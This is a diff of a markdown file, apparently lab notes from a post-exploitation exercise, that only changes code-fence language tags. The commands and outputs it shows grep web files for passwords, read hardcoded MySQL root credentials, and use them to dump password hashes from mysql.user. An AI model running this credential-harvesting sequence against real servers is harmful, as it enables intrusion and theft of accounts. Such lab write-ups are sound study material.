@@ -38,7 +38,7 @@
 
 ## comando : ps aux
 
-``` 
+``` ruby
   USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
   root         1  0.0  0.8  33480  4048 ?        Ss   06:28   0:01 /sbin/init
   root         2  0.0  0.0      0     0 ?        S    06:28   0:00 [kthreadd]
@@ -208,7 +208,7 @@
   ```
 
 ## comando : netstat -tulpn
-```
+```ruby
   Active Internet connections (only servers)
   Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
   tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -               
@@ -217,7 +217,7 @@
 ```
 
 ## comando : cat /var/www/html/BANCO\ DE\ DADOS/bd.sql
-```
+```ruby
   -- MySQL dump 10.13  Distrib 5.1.63, for debian-linux-gnu (i486)
   --
   -- Host: localhost    Database: cfp
@@ -276,7 +276,7 @@
 ```
 ## comando : find /var/www/html -name "*.php" -exec grep -l "mysql_connect\|password\|user" {} \;
 
-```
+```ruby
   /var/www/html/prog/submission.php
   /var/www/html/prog/auth.php
   /var/www/html/prog/db.php
@@ -291,7 +291,7 @@
 
 ## comando :grep -n "mysql_connect\|password\|user" /var/www/html/prog/submission.php
 
-```
+```ruby
   4:  public $id, $title, $email, $password, $description, $bio, $filename, $admin;
   5:  function __construct($id, $title, $email, $password, $description, $bio, $filename ){
   9:    $this->password = $password;
@@ -305,7 +305,7 @@
 
 ## comando : ls -la /var/www/html/prog/
 
-```
+```ruby
     total 28
     drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:30 .
     drwxr-xr-x 12 www-data www-data 4096 Sep 19 10:58 ..
@@ -316,13 +316,13 @@
 ```
 ## comando : mysql --version
 
-```
+```ruby
 mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.3
 ```
 
 
 ## comando : cat /var/www/html/prog/db.php
-```
+```ruby
   <!--?php
   
       $lnk = @mysql_connect("localhost", "root", "dbhacklfi");
@@ -338,7 +338,7 @@ mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.
 
 ## comando : mysql -u root -pdbhacklfi -e "show databases;"
 
-```
+```ruby
   Database
   information_schema
   deseclfi
@@ -348,44 +348,44 @@ mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.
 
 ## comando : mysql -u root -pdbhacklfi -e "use deseclfi; show tables;"
 
-```
+```ruby
   Tables_in_deseclfi
   submissions
 ```
 ## comando: mysql -u root -pdbhacklfi -e "use mysql; show tables;"
 
-``` 
-Tables_in_mysql
-columns_priv
-db
-event
-func
-general_log
-help_category
-help_keyword
-help_relation
-help_topic
-host
-ndb_binlog_index
-plugin
-proc
-procs_priv
-proxies_priv
-servers
-slow_log
-tables_priv
-time_zone
-time_zone_leap_second
-time_zone_name
-time_zone_transition
-time_zone_transition_type
-user
+```ruby
+  Tables_in_mysql
+  columns_priv
+  db
+  event
+  func
+  general_log
+  help_category
+  help_keyword
+  help_relation
+  help_topic
+  host
+  ndb_binlog_index
+  plugin
+  proc
+  procs_priv
+  proxies_priv
+  servers
+  slow_log
+  tables_priv
+  time_zone
+  time_zone_leap_second
+  time_zone_name
+  time_zone_transition
+  time_zone_transition_type
+  user
 
 ```
 
 
 ## comando : mysql -u root -pdbhacklfi -e "use mysql; select user, host, password from user;"
-```
+```ruby
   user	host	password
   root	localhost	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
   root	rh	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
